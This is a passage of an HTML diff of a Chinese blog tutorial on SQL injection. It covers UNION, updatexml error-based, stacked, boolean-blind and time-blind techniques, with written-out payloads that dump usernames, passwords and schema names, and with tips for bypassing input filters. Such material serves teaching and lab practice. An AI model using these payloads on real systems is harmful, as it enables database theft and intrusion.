-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">111</span>’ <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(username),group_concat(password) <span class="keyword">from</span> security.users <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">111</span>’ <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(username),group_concat(password) <span class="hljs-keyword">from</span> security.users <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>
 
 <p>其中第一段代码中的0x5c是\的十六进制编码，便于将password和username分开</p>
 <p>至此，UNION注入完成。</p>
-<h3 id="2-Error注入攻击："><a href="#2-Error注入攻击：" class="headerlink" title="2.Error注入攻击："></a>2.Error注入攻击：</h3><h4 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h4><p>通过让网站执行SQL时报错来查询自己想要的信息</p>
+<h3><span id="2error注入攻击">2.Error注入攻击：</span></h3><h4><span id="原理">原理：</span></h4><p>通过让网站执行SQL时报错来查询自己想要的信息</p>
 <p><strong>有关函数：</strong></p>
 <p><strong>updatexml（）函数</strong></p>
 <ul>
@@ -188,17 +391,17 @@ replay-btn" aria-hidden="true"></i></a>
 <li>例如： select * from test where ide &#x3D; 1 and (updatexml(1,0x7e,3)); 由于0x7e是~，不属于xpath语法格式，因此报出xpath语法错误。</li>
 </ul>
 <p>如果我们在参数2的位置，将查询语句和特殊符号拼接在一起，就可以将查询结果显示在报错信息中，在地址栏中输入：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and updatexml(1, concat(0x7e,version()), 3) -- a</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and updatexml(1, concat(0x7e,version()), 3) -- a</span><br></code></pre></td></tr></table></figure>
 
 <p>参数2内容中的查询结果显示在数据库的报错信息中，并回显到页面。</p>
 <p>提示：version（）：返回数据库版本</p>
 <p>concat（）：拼接特殊符号和查询结果</p>
 <p>需要注意的是：查询结果必须是一个数据，如果查询结果是多行或多个数据，可以</p>
-<p><img src="https://img-blog.csdnimg.cn/a5f778a3fdcf433da4f31339fe655564.png" alt="在这里插入图片描述"></p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://img-blog.csdnimg.cn/a5f778a3fdcf433da4f31339fe655564.png" alt="在这里插入图片描述" class="lazyload"></p>
 <p>updatexml() 函数的报错内容长度不能超过32个字符，常用的解决方式有两种：</p>
 <ol>
 <li><p>limit 分页</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; and updatexml(1,concat(0x7e,</span></span><br><span class="line"><span class="string">	(select user</span></span><br><span class="line"><span class="string">	from mysql.user limit 1,1)</span></span><br><span class="line"><span class="string">),3) -- a</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; and updatexml(1,concat(0x7e,</span><br><span class="hljs-string">	(select user</span><br><span class="hljs-string">	from mysql.user limit 1,1)</span><br><span class="hljs-string">),3) -- a</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure>
 
 
 </li>
@@ -206,51 +409,123 @@ replay-btn" aria-hidden="true"></i></a>
 </li>
 </ol>
 <p>以查询数据库用户为例：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; and updatexml(1,concat(0x7e,</span></span><br><span class="line"><span class="string">	substr(</span></span><br><span class="line"><span class="string">		(select group_concat(user)</span></span><br><span class="line"><span class="string">		from mysql.user)</span></span><br><span class="line"><span class="string">	, 1 , 31)</span></span><br><span class="line"><span class="string">),3) -- a</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; and updatexml(1,concat(0x7e,</span><br><span class="hljs-string">	substr(</span><br><span class="hljs-string">		(select group_concat(user)</span><br><span class="hljs-string">		from mysql.user)</span><br><span class="hljs-string">	, 1 , 31)</span><br><span class="hljs-string">),3) -- a</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure>
 
-<h3 id="步骤总结："><a href="#步骤总结：" class="headerlink" title="步骤总结："></a>步骤总结：</h3><h5 id="1-判断是否报错"><a href="#1-判断是否报错" class="headerlink" title="1.判断是否报错"></a>1.判断是否报错</h5><p>参数中添加单&#x2F;双引号，页面报错才可进行下一步。</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; -- a</span></span><br></pre></td></tr></table></figure>
+<h3><span id="步骤总结">步骤总结：</span></h3><h5><span id="1判断是否报错">1.判断是否报错</span></h5><p>参数中添加单&#x2F;双引号，页面报错才可进行下一步。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; -- a</span><br></code></pre></td></tr></table></figure>
 
-<h5 id="2-判断报错条件"><a href="#2-判断报错条件" class="headerlink" title="2.判断报错条件"></a>2.判断报错条件</h5><p>参数中添加报错函数，检查报错信息是否正常回显</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and updatexml(1,&#x27;</span><span class="operator">~</span><span class="string">&#x27;,3) -- a</span></span><br></pre></td></tr></table></figure>
+<h5><span id="2判断报错条件">2.判断报错条件</span></h5><p>参数中添加报错函数，检查报错信息是否正常回显</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and updatexml(1,&#x27;</span><span class="hljs-operator">~</span><span class="hljs-string">&#x27;,3) -- a</span><br></code></pre></td></tr></table></figure>
 
-<h5 id="3-脱库"><a href="#3-脱库" class="headerlink" title="3.脱库"></a>3.脱库</h5><p>获取所有数据库</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; and updatexml(1,concat(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,</span></span><br><span class="line"><span class="string">	substr( </span></span><br><span class="line"><span class="string">		(select group_concat(schema_name)</span></span><br><span class="line"><span class="string">		from information_schema.schemata)</span></span><br><span class="line"><span class="string">	, 1 , 31)</span></span><br><span class="line"><span class="string">),3) -- a</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
+<h5><span id="3脱库">3.脱库</span></h5><p>获取所有数据库</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; and updatexml(1,concat(&#x27;</span><span class="hljs-operator">~</span><span class="hljs-string">&#x27;,</span><br><span class="hljs-string">	substr( </span><br><span class="hljs-string">		(select group_concat(schema_name)</span><br><span class="hljs-string">		from information_schema.schemata)</span><br><span class="hljs-string">	, 1 , 31)</span><br><span class="hljs-string">),3) -- a</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure>
 
 <p>获取所有表</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,</span></span><br><span class="line"><span class="string">	substr( </span></span><br><span class="line"><span class="string">		(select group_concat(table_name)</span></span><br><span class="line"><span class="string">		from information_schema.tables</span></span><br><span class="line"><span class="string">		where table_schema = &#x27;</span>security<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">	, 1 , 31)</span></span><br><span class="line"><span class="string">),3) -- a</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and updatexml(1,concat(&#x27;</span><span class="hljs-operator">~</span><span class="hljs-string">&#x27;,</span><br><span class="hljs-string">	substr( </span><br><span class="hljs-string">		(select group_concat(table_name)</span><br><span class="hljs-string">		from information_schema.tables</span><br><span class="hljs-string">		where table_schema = &#x27;</span>security<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">	, 1 , 31)</span><br><span class="hljs-string">),3) -- a</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure>
 
 <p>获取所有字段</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,</span></span><br><span class="line"><span class="string">	substr( </span></span><br><span class="line"><span class="string">		(select group_concat(column_name)</span></span><br><span class="line"><span class="string">		from information_schema.columns</span></span><br><span class="line"><span class="string">		where table_schema = &#x27;</span>security<span class="string">&#x27; and table_name = &#x27;</span>users<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">	, 1 , 31)</span></span><br><span class="line"><span class="string">),3) -- a</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and updatexml(1,concat(&#x27;</span><span class="hljs-operator">~</span><span class="hljs-string">&#x27;,</span><br><span class="hljs-string">	substr( </span><br><span class="hljs-string">		(select group_concat(column_name)</span><br><span class="hljs-string">		from information_schema.columns</span><br><span class="hljs-string">		where table_schema = &#x27;</span>security<span class="hljs-string">&#x27; and table_name = &#x27;</span>users<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">	, 1 , 31)</span><br><span class="hljs-string">),3) -- a</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure>
 
-<h3 id="3-堆叠注入"><a href="#3-堆叠注入" class="headerlink" title="3.堆叠注入"></a>3.堆叠注入</h3><p>堆叠注入，顾名思义，就是将语句堆叠在一起进行查询<br>原理很简单，mysql_multi_query() 支持多条sql语句同时执行，就是用个;分隔，成堆的执行sql语句</p>
+<h3><span id="3堆叠注入">3.堆叠注入</span></h3><p>堆叠注入，顾名思义，就是将语句堆叠在一起进行查询<br>原理很简单，mysql_multi_query() 支持多条sql语句同时执行，就是用个;分隔，成堆的执行sql语句</p>
 <p>虽然这个注入姿势很牛逼，但实际遇到很少，其可能受到API或者数据库引擎，又或者权限的限制只有当调用数据库函数支持执行多条sql语句时才能够使用，利用mysqli_multi_query()函数就支持多条sql语句同时执行，但实际情况中，如PHP为了防止sql注入机制，往往使用调用数据库的函数是mysqli_ query()函数，其只能执行一条语句，分号后面的内容将不会被执行，所以可以说堆叠注入的使用条件十分有限，一旦能够被使用，将可能对网站造成十分大的威胁。</p>
+<h2><span id="盲注">盲注：</span></h2><h3><span id="1布尔盲注">1.布尔盲注</span></h3><pre><code>当存在SQL注入时，攻击者无法通过页面或请求的返回信息，回显或获取到SQL注入语句的执行结果，这种情况就叫盲注。
+布尔型盲注就是利用返回的True或False来判断注入语句是否执行成功。它只会根据你的注入信息返回Ture跟Fales，也就没有了之前的报错信息。
+</code></pre>
+<p><strong>什么情况下考虑使用布尔盲注？</strong></p>
+<pre><code>1. 该输入框存在注入点。
+2. 该页面或请求不会回显注入语句执行结果，故无法使用UNION注入。
+3. 对数据库报错进行了处理，无论用户怎么输入都不会显示报错信息，故无法使用报错注入。
 
-  </div>
+length（str）函数 返回字符串的长度
+substr（str,poc,len）截取字符串,poc表示截取字符串的开始位，len表示截取字符串的长度
+ascii（）返回字符的ascii码，返回该字符对应的ascii码
+count（）：返回当前列的数量
+case when (条件) then 代码1 else 代码2 end :条件成立，则执行代码1，否则执行代码2
+</code></pre>
+<p>1、如果程序过滤了substr函数，可以用其他函数代替：效果与substr（）一样<br>    left（str，index）从左边第index开始截取<br>    right(str，index)从右边第index开始截取<br>    substring（str，index）从左边index开始截取<br>    mid（str，index，len）截取str从index开始，截取len的长度<br>    lpad（str，len，padstr）<br>    rpad（str，len，padstr）在str的左（右）两边填充给定的padstr到指定的长度len，返回填充的结果</p>
+<p>2、如果程序过滤了 &#x3D; （等于号），可以用in()、like代替，效果一样：</p>
+<p>3、如果程序过滤了ascii（），可以用hex()、bin（）、ord()代替，效果一样。</p>
+<h4><span id="布尔盲注一般流程"><strong>布尔盲注一般流程：</strong></span></h4><p>因为盲注不能直接用database（）函数得到数据库名，所以步骤如下：<br>①<strong>判断数据库名的长度</strong>：<strong>and length(database())&gt;11</strong> 回显正常；<strong>and length(database())&gt;12</strong> 回显错误，说明数据库名是等于12个字符。</p>
+<p>②<strong>猜测数据库名</strong>（使用ascii码来依次判断）：a<strong>nd (ascii(substr(database(),1,1)))&gt;100 –+</strong> 通过不断测试，确定ascii值，查看asciii表可以得出该字符，通过改变database（）后面第一个数字，可以往后继续猜测第二个、第三个字母…</p>
+<p><strong>③猜测表名</strong>：<strong>and (ascii(substr((select table_name from information_schema.tables where table.schema&#x3D;database() limit 1,1)1,1)&gt;144 –+</strong> 往后继续猜测第二个、第三个字母…</p>
+<p>④<strong>猜测字段名（列名）</strong>：<strong>and (ascii(substr((select column_name from information_schema.columns where table.schema&#x3D;database() and table_name&#x3D;’数据库表名’ limit 0,1)1,1)&gt;105 –+</strong> 经过猜测 ascii为 105 为i 也就是表的第一个列名 id的第一个字母;同样,通过修改 limit 0,1 获取第二个列名 修改后面1,1的获取当前列的其他字段.</p>
+<p>⑤<strong>猜测字段内容</strong>：因为知道了列名，所以直接 <strong>select password from users</strong> 就可以获取password里面的内容，username也一样 <strong>and (ascii(substr(( select password from users limit 0,1),1,1)))&#x3D;68–+</strong></p>
+<h3><span id="2时间盲注">2.时间盲注</span></h3><pre><code>界面返回值只有一种,true 无论输入任何值 返回情况都会按正常的来处理。加入特定的时间函数，通过查看web页面返回的时间差来判断注入的语句是否正确。 
+时间盲注与布尔盲注类似。时间型盲注就是利用时间函数的延迟特性来判断注入语句是否执行成功。
+
+**什么情况下考虑使用时间盲注？**
+1. 无法确定参数的传入类型。整型，加单引号，加双引号返回结果都一样
+2. 不会回显注入语句执行结果，故无法使用UNION注入
+3. 不会显示报错信息，故无法使用报错注入
+4. 符合盲注的特征，但不属于布尔型盲注
+
+sleep(n)：将程序挂起一段时间 n为n秒。
+if(expr1,expr2,expr3):判断语句 如果第一个语句正确就执行第二个语句如果错误执行第三个语句。
+
+使用sleep()函数和if()函数：`and (if(ascii(substr(database(),1,1))&gt;100,sleep(10),null))  --+`   如果返回正确则 页面会停顿10秒，返回错误则会立马返回。只有指定条件的记录存在时才会停止指定的秒数。
+</code></pre>
+
+	</article>
+
+	 
+    <div class="kira-post-copyright">
+        <strong>Author：</strong>John Doe<br>
+        <strong>Link：</strong><a href="http://example.com/2024/04/04/Web/" title="http:&#x2F;&#x2F;example.com&#x2F;2024&#x2F;04&#x2F;04&#x2F;Web&#x2F;" target="_blank" rel="noopener">http:&#x2F;&#x2F;example.com&#x2F;2024&#x2F;04&#x2F;04&#x2F;Web&#x2F;</a><br>
+        
+            <strong>版权声明：</strong>本文采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/cn/deed.zh" target="_blank">CC BY-NC-SA 3.0 CN</a> 协议进行许可
+        
+    </div>
+
   
+	<div class="kira-post-nav">
+		<nav class="post-nav">
+			
+		</nav>
+	</div>
+	
+	<div class="kira-post-meta kira-rainbow">
+		
+		
+	</div>
+	
+	<div class="kira-post-footer">
+		
+
+		
+	<div class="giscus"></div>
+  
+    <script src="https://giscus.app/client.js"
+      data-repo="-your github username-/-your giscus repo-"
+      data-repo-id="-your giscus repo ID-"
+      data-category="Announcements"
+      data-category-id="-giscus category id-"
+      data-mapping="pathname"
+      data-strict="0"
+      data-reactions-enabled="1"
+      data-emit-metadata="0"
+      data-input-position="top"
+      data-theme="light"
+      data-lang="en"
+      data-loading="lazy"
+      crossorigin="anonymous"
+      async  
+    ></script>
+  
+
+	</div>
+	
 </div>
-          </div>
-        </div>
 
-        <link rel="stylesheet" href="/css/footer.css">
-<div class="bottom-outer">
-  <div class="copyright">©2021 - 2021 By Tanger</div>
-  <div class="framework-info">
-    <span>Power by</span>
-    <a class="a1" target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>
-    <span class="footer-separator">|</span>
-    <span>Theme by</span>
-    <a class="a2" target="_blank" rel="noopener" href="https://github.com/redhat123456/hexo-theme-MiHoYo">MiHoYo</a>
-  </div>
+				</div>
+			</div>
+			<div class="kira-right-column">
+	<a onclick="document.querySelector('#kira-top-header').scrollIntoView({behavior: 'smooth'});" class="kira-backtotop" aria-label="回到顶部" title="回到顶部">
+		<button class="mdui-fab mdui-ripple">
+			<i class="kirafont icon-caret-up"></i>
+		</button>
+	</a>
 </div>
 
-          
-            <!-- scripts list from theme config.yml -->
-            
-              <script src="/js/MiHoYo.js"></script>
-              
-                
-
-  </body>
-
-  </html>
+		</div>
+	</body>
+</html>
